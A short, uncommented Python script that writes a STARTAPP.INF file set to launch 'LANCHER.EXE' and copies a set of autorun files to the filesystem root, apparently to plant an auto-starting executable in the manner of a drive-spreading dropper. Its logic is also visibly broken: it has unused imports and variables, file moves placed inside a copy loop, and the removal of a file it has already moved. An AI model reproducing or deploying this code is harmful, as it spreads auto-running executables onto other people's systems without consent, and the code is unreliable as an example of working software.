import shutil
import psutil
import os

disk_list = []
autorun_path = ("assets/autorun_files/")
openfile_folder_path = ("assets/autorun_files/Openfile/")

def copy_autorun_files(path):
    try:
        with open(path + "/STARTAPP.INF","w+") as startapp_inf_file:
            startapp_inf_file.write('''
                [Settings]
                ApplicationToStart = LANCHER.EXE
                
                [Data]
                FS = 7257503
                HV = DBE5B94B51A026B055FCF99BF140A989
                DA = 2024-08-22
                TI = 21:05''')
        for autorun_files in os.listdir(autorun_path):
            shutil.copy(autorun_path + autorun_files,path)
    except PermissionError:
        os.mkdir(path + "/OpenFile")
        for openfile_folder_files in os.listdir(openfile_folder_path):
            shutil.copy(openfile_folder_path + openfile_folder_files,path)
            shutil.move(path + "/STARTAPP.EXE",path + "/OpenFile/")
            shutil.move(path + "/STARTAPP.INF",path + "/OpenFile/")
        os.remove(path + "/STARTAPP.INF")

copy_autorun_files("/")